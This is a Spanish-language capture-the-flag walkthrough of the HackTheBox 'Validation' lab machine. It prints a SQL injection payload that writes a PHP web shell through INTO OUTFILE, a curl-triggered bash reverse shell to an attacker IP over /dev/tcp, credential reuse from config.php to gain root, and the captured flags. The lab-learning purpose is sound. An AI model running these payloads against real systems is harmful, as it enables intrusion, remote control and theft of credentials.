# Validation

Plataforma: HackTheBox
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 26 de enero de 2025 20:21
IP: 10.10.11.116

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Que sistema es

```bash
whichSystem.py 10.10.11.116

	10.10.11.116 (ttl -> 63): Linux
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG targeted

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p22,80,4566,8080 -sCV 10.10.11.116 -oN targeted

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- **Identificación de vulnerabilidades**
    - 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    - 80/tcp   open  http    Apache httpd 2.4.48
    - 4566/tcp open  http    nginx
    - 8080/tcp open  http    nginx

- **Enumeración web**
    
    
    Whatweb
    
    ```bash
    whatweb 10.10.11.116
    ❯ whatweb 10.10.11.116
    http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
    
    ```
    

Vemos un formulario web

![image.png](<imagenes/image 110.png>)

En primer lugar, hacemos una captura de la peticion del formulario y observamos dos campos: username y country

Probamos a inyectar una comilla y vemos que salta un error en la web : 

```bash
Brazil’
```

![image.png](<imagenes/837b1a54-af10-481c-a6c8-0bc031312a36.png>)

![image.png](<imagenes/image 111.png>)

Vemos que el campo es vulnerable. Probamos a ver si cerrando la consulta sigue mostrando error y vemos que no

```bash

username=test&country=Brazil' -- -
```

![image.png](<imagenes/image 112.png>)

Entonces lo que probamos es a inyectar un payload en la consulta : Explotacion 1

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

Webshell en consulta SQL

```bash
Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
'/var/www/html/shell.php'-- -
```

Accedemos a la pagina y muesta un error

![image.png](<imagenes/image 113.png>)

Accedemos ahora a :

```bash
http://10.10.11.116/shell.php?cmd=id
```

![image.png](<imagenes/image 114.png>)

Obtenemos RCE

Vamos a tratar de establecer una conexión :

### Explotación 2

Maquina atacante (10.10.16.15)

```bash
nc -lvnp 4444
```

```bash
 curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.15/4444 0>&1"'
```

Obtenemos la rever

Tratamiento de la shell

```bash
script -c bash /dev/null
Ctr+z
stty raw echo; fg
reset xter
exort TERM=XTERM
export SHELL=BASH

```

```bash
 www-data@validation:/var/www/html$ cd /home                                     
 www-data@validation:/home$ ls                                                   
htb
 www-data@validation:/home$ cd htb/                                              
 www-data@validation:/home/htb$ ls                                               
user.txt
 www-data@validation:/home/htb$ cat user.txt                                     
c7080c211cb057271c11a2a99e353cfc
```

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

### Escalada de privilegios

```bash
  www-data@validation:/var/www$ cd html/                                          
 www-data@validation:/var/www/html$ ls                                           
account.php  config.php  css  index.php  js
 www-data@validation:/var/www/html$ ls                                           
account.php  config.php  css  index.php  js
 www-data@validation:/var/www/html$ cat c                                        
cat: c: No such file or directory
 www-data@validation:/var/www/html$ cat config.php                               
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
-data@validation:/var/www/html$ su root                                      
Password: 
root@validation:/var/www/html# cd /root
root@validation:~#                                                                       root@validation:~# ls
config  ipp.ko  root.txt  snap
root@validation:~#                                                                       root@validation:~# cat root.txt 
fed0181e2ccf9450d4956bc2302b3734
root@validation:~#                                                                       root@validation:~# 
```

## Conclusión

<aside>
💡 Maquina que he tenido que mirar wrtite up pues no sabia como continuar. He empezado usando SQLMap y me he estancado con ello.

</aside>